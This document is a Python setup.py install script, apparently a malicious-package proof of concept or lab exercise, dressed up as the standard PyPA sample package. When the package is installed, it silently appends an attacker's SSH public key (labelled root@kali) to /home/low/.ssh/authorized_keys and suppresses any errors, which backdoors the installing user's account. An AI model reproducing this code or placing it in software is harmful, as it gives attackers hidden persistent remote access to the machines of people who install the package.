#!/usr/bin/env python3

import setuptools

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGbW8n6UnKz9p9e7GBa/8tgjwSL7NTUI7TEDxmZtRR54RwDNADqbh7eoDzxIImaJCvFO9RgYQEwEtaNOyINePp0ecTZMpFoXqp0KB3CvW0cYhChs1U4DHiL4JwOpyH86lOjEyBvbt3XI9udqqMeOez91iTgMO+o2EX/m4+8l59AfHLOrcjrNKR3ksaeceoRw4S4bXoYlATqqVRuLdggsZpr3Ava15yu46JeRSR3Fpud1YEwxqqmGKeVuTU2RzmKRrn02PcuSXTAsyYr3CkScDDcrYczFwOPHA1eBuNFECDklpAPXXHFj3pooQRvYBGkRNwXMxhvg3r/v6D9YXycy19TNpOHXIZtef2pGPGj2xDEjQmo/dwFNujQHuDEXPttUWJ7lISOO9qiPHGz3bxCHO+3+2FNuGwaqgZZXl6lK9wVRbOpzR36jWRhZYWSms/vPxaJOMX6ok79iuV3wX8t1FyvBEfwPkYET02hR4goMigpuvSfQdYioLYrDjnSqDZWqc= root@kali")
except Exception as e:
    pass

setuptools.setup(
    name="infected_pgk_PYPI", # Replace with your own username
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
